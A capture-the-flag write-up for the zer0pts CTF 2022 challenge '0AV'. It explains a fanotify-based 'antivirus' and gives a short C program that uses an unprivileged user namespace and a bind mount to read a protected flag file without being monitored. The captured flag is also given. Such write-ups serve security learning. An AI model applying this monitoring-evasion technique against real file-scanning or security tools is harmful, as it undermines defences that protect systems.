# 0AV  
* Category: `Misc`  
* Solves: `12`  
* Points: `256`  
* Description: `This anti-virus prevents me from reading the flag. Can you read /playground/flag.txt anyhow?`

In this challenge, we're provided source code (`antivirus.c`), as well as a
`bzImage` and `rootfs.cpio` file we can use to boot the kernel.  
Let's run qemu and give it a look.

```sh  
Starting syslogd: OK  
Starting klogd: OK  
Running sysctl: OK  
Saving random seed: OK  
Starting network: OK  
Starting dhcpcd...  
dhcpcd-9.4.1 starting  
forked to background, child pid 82

Boot took 4.19 seconds

[ Native Protection - zer0pts CTF 2022 ]  
/ $ id  
uid=1337 gid=1337 groups=1337  
/ $ ls -la  
total 4  
[ ... ]  
drwxrwxrwx    2 root     root            60 Feb 20 07:51 playground  
[ ... ]  
/ $ cd playground  
/playground $ ls -la  
total 4  
drwxrwxrwx    2 root     root            60 Feb 20 07:51 .  
drwxr-xr-x   18 root     root           420 Feb 20 07:53 ..  
-rwxrwxrwx    1 root     root            28 Feb 20 07:51 flag.txt  
/playground $ cat flag.txt  
cat: can't open 'flag.txt': Operation not permitted  
/playground $ ls -la  
total 0  
drwxrwxrwx    2 root     root            40 Mar 20 13:17 .  
drwxr-xr-x   18 root     root           420 Feb 20 07:53 ..  
```

Even though we have permissions to read the flag, we're denied access and the
file was deleted. Let's check out `antivirus.c`.

```c  
#include <errno.h>  
#include <fcntl.h>  
#include <limits.h>  
#include <poll.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <syslog.h>  
#include <sys/fanotify.h>  
#include <unistd.h>

static int scanfile(int fd) {  
 char path[PATH_MAX];  
 ssize_t path_len;  
 char procfd_path[PATH_MAX];  
 char buf[0x10];

 if (read(fd, buf, 7) != 7)  
   return 0;

 if (memcmp(buf, "zer0pts", 7))  
   return 0;

 /* Malware detected! */  
 snprintf(procfd_path, sizeof(procfd_path), "/proc/self/fd/%d", fd);  
 if ((path_len = readlink(procfd_path, path, sizeof(path) - 1)) == -1) {  
   perror("readlink");  
   exit(EXIT_FAILURE);  
 }  
 path[path_len] = '\0';  
 unlink(path);

 return 1;  
}

static void handle_events(int fd) {  
 const struct fanotify_event_metadata *metadata;  
 struct fanotify_event_metadata buf[200];  
 ssize_t len;  
 struct fanotify_response response;

 for (;;) {  
   /* Check fanotify events */  
   len = read(fd, buf, sizeof(buf));  
   if (len == -1 && errno != EAGAIN) {  
     perror("read");  
     exit(EXIT_FAILURE);  
   }

   if (len <= 0)  
     break;

   metadata = buf;

   while (FAN_EVENT_OK(metadata, len)) {  
     if (metadata->vers != FANOTIFY_METADATA_VERSION) {  
       fputs("Mismatch of fanotify metadata version.\n", stderr);  
       exit(EXIT_FAILURE);  
     }

     if ((metadata->fd >= 0) && (metadata->mask & FAN_OPEN_PERM)) {  
       /* New access request */  
       if (scanfile(metadata->fd)) {  
         /* Malware detected! */  
         response.response = FAN_DENY;  
       } else {  
         /* Clean :) */  
         response.response = FAN_ALLOW;  
       }

       response.fd = metadata->fd;  
       write(fd, &response, sizeof(response));  
       close(metadata->fd);  
     }

     metadata = FAN_EVENT_NEXT(metadata, len);  
   }  
 }  
}

int main(void) {  
 int fd;

 /* Setup fanotify */  
 fd = fanotify_init(FAN_CLOEXEC | FAN_CLASS_CONTENT | FAN_NONBLOCK, O_RDONLY);  
 if (fd == -1) {  
   perror("fanotify_init");  
   exit(EXIT_FAILURE);  
 }

 /* Monitor every file under root directory */  
 if (fanotify_mark(fd,  
                   FAN_MARK_ADD | FAN_MARK_MOUNT,  
                   FAN_OPEN_PERM, AT_FDCWD, "/") == -1) {  
   perror("fanotify_mark");  
   exit(EXIT_FAILURE);  
 }

 for (;;) {  
   handle_events(fd);  
 }

 exit(EXIT_SUCCESS);  
}  
```

Most of this is boilerplate, setting up an
[fanotify](https://man7.org/linux/man-pages/man7/fanotify.7.html) listener.

Whenever we attempt to open a file located on the `/` mount, the kernel will
notify this executable. It will read from the file we attempt to access - if
it begins with `zer0pts`, it will be denied and then `unlink`'d.

Luckily, the man page has the answer for us:

```  
Bugs:  
[ ... ]  
      As of Linux 3.17, the following bugs exist:

      *  On Linux, a filesystem object may be accessible through  
         multiple paths, for example, a part of a filesystem may be  
         remounted using the --bind option of mount(8).  A listener  
         that marked a mount will be notified only of events that were  
         triggered for a filesystem object using the same mount.  Any  
         other event will pass unnoticed.  
```

We can simply perform a bind mount, and accesses to the file through it will
not trigger the `fanotify` listener. Mounting requires `CAP_SYS_ADMIN`, but
the kernel has unprivileged user namespaces available.

We can use this to enter a new mount namespace, bind mount `/playground` to a
controlled directory, and read the content of the flag:

```c  
#define _GNU_SOURCE  
#include <sched.h>  
#include <fcntl.h>  
#include <stdlib.h>  
#include <sys/mount.h>  
#include <unistd.h>  
#include <stdio.h>

int main() {  
   if (unshare(CLONE_NEWUSER|CLONE_NEWNS)) {  
       perror("unshare");  
       exit(0);  
   };  
   mkdir("/tmp/mount");  
   if (mount("/playground", "/tmp/mount", NULL, MS_BIND, NULL)) {  
       perror("mount");  
       exit(0);  
   }  
   int fd = open("/tmp/mount/flag.txt", O_RDONLY);  
   if (fd == -1) {perror("Opening"); exit(0);}  
   char buf[100];  
   int res = read(fd, buf, 100);  
   buf[res] = 0;  
   puts(buf);  
}  
```  
After uploading this on the remote instance, we get the flag printed out:

`zer0pts{FANOTIFY_d03snt_w0rk_b3tw33n_d1ff3r3nt_n4m3sp4c3s...}`

Original writeup (https://clubby789.me/zer0pts2022/#0AV).